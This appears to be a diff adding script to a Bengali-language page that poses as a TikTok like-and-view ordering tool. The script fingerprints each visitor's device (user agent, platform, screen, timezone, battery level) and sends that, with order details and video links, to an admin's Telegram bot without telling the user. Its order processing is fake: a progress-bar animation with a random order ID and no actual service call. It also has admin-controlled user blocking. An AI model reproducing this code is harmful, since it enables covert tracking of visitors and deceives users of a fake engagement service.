+    document.getElementById('mainForm').style.display = 'none';
+    document.getElementById('userInfo').style.display = 'block';
+    
+    // Update countdown display
+    const timeDisplay = document.getElementById('blockTimeRemaining');
+    timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+    
+    // Update the message text
+    document.getElementById('timerBlockText').innerHTML = 
+        `আপনার অ্যাকাউন্ট <span id="blockTimeRemaining">${minutes}:${seconds.toString().padStart(2, '0')}</span> এর জন্য ব্লক করা হয়েছে`;
+}
+
+function hideBlockMessage() {
+    document.getElementById('blockMessage').style.display = 'none';
+    document.getElementById('timerBlockMessage').style.display = 'none';
+    document.getElementById('mainForm').style.display = 'block';
+    document.getElementById('userInfo').style.display = 'block';
+}
+
+// Generate 8-digit UID with improved uniqueness
+function generate8DigitUID() {
+    const timestamp = Date.now().toString().slice(-5);
+    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+    const uid = (timestamp + random).padStart(8, '0').slice(-8);
+    return uid;
+}
+
+// Send new user notification to admin with improved reliability
+function sendNewUserNotification(chatId) {
+    const userInfo = getUserDeviceInfo();
+    const message = `
+🆕 নতুন ইউজার সংযুক্ত!
+━━━━━━━━━━━━━━━━━━
+👤 ইউজার আইডি: ${chatId}
+⏰ সময়: ${new Date().toLocaleString()}
+🌐 ডিভাইস তথ্য:
+   - Platform: ${userInfo.platform}
+   - Screen: ${userInfo.screenResolution}
+   - Language: ${userInfo.language}
+   - Timezone: ${userInfo.timezone}
+   - User Agent: ${userInfo.userAgent.substring(0, 30)}...
+
+💬 এই আইডি দিয়ে ইউজারকে ব্লক/আনব্লক করতে পারবেন।
+    `;
+
+    sendTelegramMessage(message);
+}
+
+function getUserDeviceInfo() {
+    return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenResolution: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+}
+
+function sendTelegramMessage(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: ADMIN_CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+        })
+    }).catch(error => console.error('Telegram error:', error));
+}
+
+// Check user status and messages every 3 seconds
+setInterval(() => {
+    checkUserStatus();
+    checkAdminMessages();
+    updateUserActivity();
+}, 3000);
+
+// Initial checks
+checkUserStatus();
+checkAdminMessages();
+updateUserActivity();
+
+// Original application code
+const serviceSelect = document.getElementById("serviceType");
+const videoInput = document.getElementById("videoUrl");
+const amountInput = document.getElementById("amount");
+const infoText = document.getElementById("infoText");
+const countdownText = document.getElementById("countdownText");
+const resetLinkNotice = document.getElementById("resetLinkNotice");
+const resetLinkBtn = document.getElementById("resetLinkBtn");
+const submitBtn = document.getElementById("submitBtn");
+const settingsBtn = document.getElementById("settingsBtn");
+const loader = document.querySelector(".loader");
+const progressBar = document.getElementById("progressBar");
+
+const orderCooldown = 10; // minutes
+const ordersNeededToReset = 5;
+
+let orderCount = parseInt(localStorage.getItem("orderCount")) || 0;
+let savedUrl = localStorage.getItem("savedUrl") || "";
+let ordersWithCurrentLink = parseInt(localStorage.getItem("ordersWithCurrentLink")) || 0;
+
+// Update order info
+function updateOrderInfo() {
+    infoText.innerText = `✅ মোট অর্ডার: ${orderCount} | এই লিংকের অর্ডার: ${ordersWithCurrentLink}/${ordersNeededToReset}`;
+    if (ordersWithCurrentLink >= ordersNeededToReset) {
+        resetLinkBtn.style.display = "block";
+        resetLinkNotice.innerText = "✅ 5 অর্ডার সম্পন্ন! এখন লিংক রিসেট করতে পারবে।";
+    } else {
+        resetLinkBtn.style.display = "none";
+        resetLinkNotice.innerText = ordersWithCurrentLink > 0 ?
+            `🔒 লিংক লক! ${ordersNeededToReset - ordersWithCurrentLink} অর্ডার বাকি।` : "";
+    }
+}
+
+// Lock URL input
+function lockUrlForce() {
+    if (savedUrl && ordersWithCurrentLink < ordersNeededToReset) {
+        videoInput.value = savedUrl;
+        videoInput.readOnly = true;
+        if (videoInput.value !== savedUrl) videoInput.value = savedUrl;
+    } else {
+        videoInput.readOnly = false;
+    }
+}
+
+updateOrderInfo();
+lockUrlForce();
+setInterval(lockUrlForce, 100);
+
+// Reset link button
+resetLinkBtn.addEventListener("click", function() {
+    if (ordersWithCurrentLink >= ordersNeededToReset) {
+        savedUrl = "";
+        ordersWithCurrentLink = 0;
+        localStorage.removeItem("savedUrl");
+        localStorage.setItem("ordersWithCurrentLink", "0");
+        videoInput.readOnly = false;
+        videoInput.value = "";
+        updateOrderInfo();
+        resetLinkNotice.innerText = "🔓 লিংক রিসেট! নতুন লিংক দিতে পারো।";
+    }
+});
+
+// Detect input and lock URL
+videoInput.addEventListener("input", function() {
+    const url = this.value.trim();
+    if ((url.includes("https://vt.tiktok.com") || url.includes("tiktok.com")) && !savedUrl) {
+        savedUrl = url;
+        localStorage.setItem("savedUrl", savedUrl);
+        lockUrlForce();
+        resetLinkNotice.innerText = "🔒 লিংক লক! 5 অর্ডার করতে হবে রিসেটের আগে।";
+    }
+});
+
+// Cooldown logic
+function checkCountdown(){
+    const lastOrder = localStorage.getItem("lastOrderTime");
+    if(lastOrder){
+        const diff = (parseInt(lastOrder)+orderCooldown*60*1000)-new Date().getTime();
+        if(diff>0){ startCountdown(diff); submitBtn.disabled=true; }
+        else{ localStorage.removeItem("lastOrderTime"); countdownText.style.display="none"; submitBtn.disabled=false; }
+    }
+}
+
+function startCountdown(duration){
+    countdownText.style.display="block";
+    let timer=duration/1000;
+    const interval=setInterval(()=>{
+        const m=Math.floor(timer/60);
+        const s=Math.floor(timer%60);
+        countdownText.innerText=`Next order in ${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        timer--;
+        if(timer<0){ clearInterval(interval); countdownText.style.display="none"; submitBtn.disabled=false; localStorage.removeItem("lastOrderTime"); }
+    },1000);
+}
+
+checkCountdown();
+
+// Settings info
+settingsBtn.addEventListener("click", ()=>{
+    alert(`এটা বানানো হয়েছে টিকটকে লাইক ভিউ নেওয়ার জন্য ⚡👍!\nDeveloper: MR_MOMIN 🖥️🖥️\nVersion: 3.0\nYour User ID: ${userChatId}\nFor demo and learning purposes only.`);
+});
+
+// Get real device info
+async function getUserInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        batteryLevel: "N/A",
+        charging: "N/A",
+        userChatId: userChatId
+    };
+    if('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            info.batteryLevel = Math.round(battery.level*100)+"%";
+            info.charging = battery.charging ? "Yes" : "No";
+        } catch(err){}
+    }
+    return info;
+}
+
+// Order form submit
+document.getElementById("orderForm").addEventListener("submit", async e=>{
+    e.preventDefault();
+    
+    // Check if user is blocked
+    const blockedUsers = JSON.parse(localStorage.getItem('mr_tools_blocked_users') || '{}');
+    const timerBlockedUsers = JSON.parse(localStorage.getItem('mr_tools_timer_blocked_users') || '{}');
+    
+    if (blockedUsers[userChatId]) {
+        alertBox.style.color="#ff6666"; 
+        alertBox.innerText="❌ আপনার অ্যাকাউন্ট অ্যাডমিন দ্বারা ব্লক করা হয়েছে!";
+        showBlockMessage();
+        return;
+    }
+    
+    if (timerBlockedUsers[userChatId]) {
+        const blockData = timerBlockedUsers[userChatId];
+        const currentTime = new Date().getTime();
+        const blockEndTime = blockData.blockTime + (blockData.duration * 60 * 1000);
+        
+        if (currentTime < blockEndTime) {
+            const remainingMinutes = Math.ceil((blockEndTime - currentTime) / (60 * 1000));
+            alertBox.style.color="#ffcc66"; 
+            alertBox.innerText=`⏱️ আপনার অ্যাকাউন্ট ${remainingMinutes} মিনিটের জন্য ব্লক করা হয়েছে!`;
+            showTimerBlockMessage(remainingMinutes, 0);
+            return;
+        }
+    }
+    
+    if(localStorage.getItem("lastOrderTime")){ alert("Cooldown চলছে! অপেক্ষা কর।"); return; }
+
+    let url = videoInput.value.trim();
+    const service = serviceSelect.value;
+    let amount = parseInt(amountInput.value);
+    if(!url.includes("https://vt.tiktok.com") && !url.includes("tiktok.com")){ 
+        alertBox.style.color="#ff6666"; alertBox.innerText="❌ Invalid TikTok URL!"; return;
+    }
+    if(amount>100) amount=100;
+    if(!savedUrl){ savedUrl=url; localStorage.setItem("savedUrl", savedUrl); ordersWithCurrentLink=0; } else { url=savedUrl; }
+
+    const orderId = Math.floor(Math.random()*1000000);
+    const time = new Date().toLocaleString();
+
+    loader.style.display="block"; progressBar.style.width="0%"; alertBox.innerText="Processing order..."; 
+
+    let width = 0; 
+    const interval=setInterval(async ()=>{
+        width+=2; progressBar.style.width = width+"%";
+        if(width>=100){
+            clearInterval(interval); loader.style.display="none"; alertBox.style.color="#66ccff"; alertBox.innerText="✅ অর্ডার সম্পন্ন!";
+
+            localStorage.setItem("lastOrderTime", new Date().getTime()); 
+            startCountdown(orderCooldown*60*1000); 
+            submitBtn.disabled = true;
+
+            // Update order counts
+            orderCount++; ordersWithCurrentLink++;
+            localStorage.setItem("orderCount", orderCount);
+            localStorage.setItem("ordersWithCurrentLink", ordersWithCurrentLink);
+            updateOrderInfo();
+            lockUrlForce();
+            
+            // Update user activity
+            updateUserActivity();
+
+            // Send Telegram notification for every 5 orders
+            if(ordersWithCurrentLink >= ordersNeededToReset){
+                const userInfo = await getUserInfo();
+                const message = 
+`🛒 নতুন অর্ডার সম্পন্ন 🛒
+━━━━━━━━━━━━━━━━━━
+🆔 অর্ডার আইডি: #${orderId}
+👤 ইউজার আইডি: ${userChatId}
+📦 সার্ভিস: ${service.toUpperCase()}
+🔢 পরিমাণ: ${amount}
+🔗 ভিডিও লিংক: ${savedUrl}
+⏰ সময়: ${time}
+
+📊 অর্ডার পরিসংখ্যান:
+━━━━━━━━━━━━━━━━━━
+✅ মোট অর্ডার: ${orderCount}
+🔗 এই লিংকের অর্ডার: ${ordersWithCurrentLink}
+🔄 রিসেট সংখ্যা: ${Math.floor(orderCount/ordersNeededToReset)}
+                `;
+                sendTelegramMessage(message);
+            }
+
+            // Reset form except URL if locked
+            serviceSelect.selectedIndex=0; amountInput.value=100;
+        }
+    },100);
+});
+</script>
+
+</body>
+  </html>
